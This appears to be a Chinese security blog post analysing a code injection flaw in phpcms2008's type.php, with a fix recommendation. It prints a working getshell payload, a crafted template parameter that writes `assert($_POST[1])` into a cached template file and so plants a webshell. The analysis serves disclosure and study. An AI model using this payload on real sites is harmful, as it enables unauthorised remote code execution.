---
title: "Phpcms2008 Type.php Getshell"
date: 2018-12-16T19:21:52+08:00
categories: ['代码审计']
tags: ['getshell','php']
---

phpcms2008老版本`type.php`存在代码注入可直接getshell。不过版本过低，使用人数较少，影响范围较小，当作拓展思路不错。

<!--more-->

## 漏洞简介

当攻击者向装有phpcms2008版本程序的网站发送如下payload时

```php
/type.php?template=tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss
```

那么`@unlink(_FILE_);assert($_POST[1]);`这句话会被写入`rss.tpl.php`，即getshell。

## 漏洞分析

![type.php](https://y4er.com/img/uploads/20190509166393.jpg "type.php")

在`type.php`中`$template`用户可控，并且下方传入了`template()`函数，这个函数是在`/include/global.func.php`定义的，跟进下

![global.func.php](https://y4er.com/img/uploads/20190509165373.jpg "global.func.php")

可以看到执行了`template_compile()`函数，继续跟进，这个函数在`/include/template.func.php`中

![template.func.php](https://y4er.com/img/uploads/20190509166561.jpg "template.func.php")

在这个方法中，`$template`变量同时被用于`$compiledtplfile`中文件路径的生成，和`$content`中文件内容的生成。

而前文所述的攻击payload将`$template`变量被设置为如下的值

```php
tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss
```

所以在`template_compile()`方法中，调用`file_put_contents()`函数时的第一个参数就被写成了`data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss.tpl.php`，这将被php解析成`data/cache_template/rss.tpl.php`。

最终，`@unlink(_FILE_);assert($_POST[1]);`将被写入该文件。

## 修复建议

手动过滤`$template`参数，避免输入`{` `(`这类字符被当作路径和脚本内容处理。

升级才是正道，那么老的版本了还有人在用，是有多懒。

## 参考链接

https://xz.aliyun.com/t/3454

